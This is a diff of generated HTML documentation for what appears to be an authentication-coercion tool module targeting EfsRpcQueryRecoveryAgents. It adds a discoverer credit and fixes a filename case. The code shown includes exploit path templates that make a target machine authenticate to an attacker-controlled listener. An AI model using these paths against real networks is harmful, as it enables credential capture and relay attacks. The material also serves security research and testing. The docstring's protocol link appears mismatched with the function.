@@ -95,14 +95,14 @@
 </span><span id="L-33"><a href="#L-33"><span class="linenos">33</span></a><span class="sd">    Coercing a machine to authenticate using function EfsRpcQueryRecoveryAgents (opnum 7) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)</span>
 </span><span id="L-34"><a href="#L-34"><span class="linenos">34</span></a>
 </span><span id="L-35"><a href="#L-35"><span class="linenos">35</span></a><span class="sd">    Method found by:</span>
-</span><span id="L-36"><a href="#L-36"><span class="linenos">36</span></a><span class="sd">     -</span>
+</span><span id="L-36"><a href="#L-36"><span class="linenos">36</span></a><span class="sd">     - [@topotam77](https://twitter.com/topotam77)</span>
 </span><span id="L-37"><a href="#L-37"><span class="linenos">37</span></a><span class="sd">    &quot;&quot;&quot;</span>
 </span><span id="L-38"><a href="#L-38"><span class="linenos">38</span></a>
 </span><span id="L-39"><a href="#L-39"><span class="linenos">39</span></a>    <span class="n">exploit_paths</span> <span class="o">=</span> <span class="p">[</span>
 </span><span id="L-40"><a href="#L-40"><span class="linenos">40</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\\</span><span class="s1">file.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="L-41"><a href="#L-41"><span class="linenos">41</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\\\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="L-42"><a href="#L-42"><span class="linenos">42</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
-</span><span id="L-43"><a href="#L-43"><span class="linenos">43</span></a>        <span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{http_listen_port}}/{{rnd(3)}}</span><span class="se">\\</span><span class="s1">File.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
+</span><span id="L-43"><a href="#L-43"><span class="linenos">43</span></a>        <span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{http_listen_port}}/{{rnd(3)}}</span><span class="se">\\</span><span class="s1">file.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="L-44"><a href="#L-44"><span class="linenos">44</span></a>    <span class="p">]</span>
 </span><span id="L-45"><a href="#L-45"><span class="linenos">45</span></a>
 </span><span id="L-46"><a href="#L-46"><span class="linenos">46</span></a>    <span class="n">access</span> <span class="o">=</span> <span class="p">{</span>
@@ -178,14 +178,14 @@
 </span><span id="EfsRpcQueryRecoveryAgents-34"><a href="#EfsRpcQueryRecoveryAgents-34"><span class="linenos">34</span></a><span class="sd">    Coercing a machine to authenticate using function EfsRpcQueryRecoveryAgents (opnum 7) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)</span>
 </span><span id="EfsRpcQueryRecoveryAgents-35"><a href="#EfsRpcQueryRecoveryAgents-35"><span class="linenos">35</span></a>
 </span><span id="EfsRpcQueryRecoveryAgents-36"><a href="#EfsRpcQueryRecoveryAgents-36"><span class="linenos">36</span></a><span class="sd">    Method found by:</span>
-</span><span id="EfsRpcQueryRecoveryAgents-37"><a href="#EfsRpcQueryRecoveryAgents-37"><span class="linenos">37</span></a><span class="sd">     -</span>
+</span><span id="EfsRpcQueryRecoveryAgents-37"><a href="#EfsRpcQueryRecoveryAgents-37"><span class="linenos">37</span></a><span class="sd">     - [@topotam77](https://twitter.com/topotam77)</span>
 </span><span id="EfsRpcQueryRecoveryAgents-38"><a href="#EfsRpcQueryRecoveryAgents-38"><span class="linenos">38</span></a><span class="sd">    &quot;&quot;&quot;</span>
 </span><span id="EfsRpcQueryRecoveryAgents-39"><a href="#EfsRpcQueryRecoveryAgents-39"><span class="linenos">39</span></a>
 </span><span id="EfsRpcQueryRecoveryAgents-40"><a href="#EfsRpcQueryRecoveryAgents-40"><span class="linenos">40</span></a>    <span class="n">exploit_paths</span> <span class="o">=</span> <span class="p">[</span>
 </span><span id="EfsRpcQueryRecoveryAgents-41"><a href="#EfsRpcQueryRecoveryAgents-41"><span class="linenos">41</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\\</span><span class="s1">file.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="EfsRpcQueryRecoveryAgents-42"><a href="#EfsRpcQueryRecoveryAgents-42"><span class="linenos">42</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\\\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="EfsRpcQueryRecoveryAgents-43"><a href="#EfsRpcQueryRecoveryAgents-43"><span class="linenos">43</span></a>        <span class="p">(</span><span class="s2">&quot;smb&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{smb_listen_port}}</span><span class="se">\\</span><span class="s1">{{rnd(8)}}</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
-</span><span id="EfsRpcQueryRecoveryAgents-44"><a href="#EfsRpcQueryRecoveryAgents-44"><span class="linenos">44</span></a>        <span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{http_listen_port}}/{{rnd(3)}}</span><span class="se">\\</span><span class="s1">File.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
+</span><span id="EfsRpcQueryRecoveryAgents-44"><a href="#EfsRpcQueryRecoveryAgents-44"><span class="linenos">44</span></a>        <span class="p">(</span><span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">{{listener}}{{http_listen_port}}/{{rnd(3)}}</span><span class="se">\\</span><span class="s1">file.txt</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
 </span><span id="EfsRpcQueryRecoveryAgents-45"><a href="#EfsRpcQueryRecoveryAgents-45"><span class="linenos">45</span></a>    <span class="p">]</span>
 </span><span id="EfsRpcQueryRecoveryAgents-46"><a href="#EfsRpcQueryRecoveryAgents-46"><span class="linenos">46</span></a>
 </span><span id="EfsRpcQueryRecoveryAgents-47"><a href="#EfsRpcQueryRecoveryAgents-47"><span class="linenos">47</span></a>    <span class="n">access</span> <span class="o">=</span> <span class="p">{</span>
@@ -246,8 +246,11 @@
 
             <div class="docstring"><p>Coercing a machine to authenticate using function EfsRpcQueryRecoveryAgents (opnum 7) of <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b">MS-FSRVP Protocol</a></p>
 
-<p>Method found by:
- -</p>
+<p>Method found by:</p>
+
+<ul>
+<li><a href="https://twitter.com/topotam77">@topotam77</a></li>
+</ul>
 </div>
 
 
